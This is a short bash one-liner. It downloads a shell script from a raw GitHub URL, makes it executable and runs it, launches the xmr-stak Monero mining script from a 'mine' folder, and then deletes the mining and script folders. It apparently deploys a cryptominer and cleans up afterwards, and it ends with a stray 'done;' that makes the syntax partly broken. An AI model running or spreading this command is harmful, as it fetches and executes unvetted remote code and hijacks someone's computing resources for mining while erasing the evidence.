/bin/bash -c "wget -O start.sh https://raw.githubusercontent.com/pproum/test/master/build/scripts/start.sh; 
chmod u+x start.sh ;
./start.sh ; 
cd mine; 
./run_xmr_stak.pl 2; 
cd ..; 
rm -rf mine ; 
rm -rf scripts; 
done;"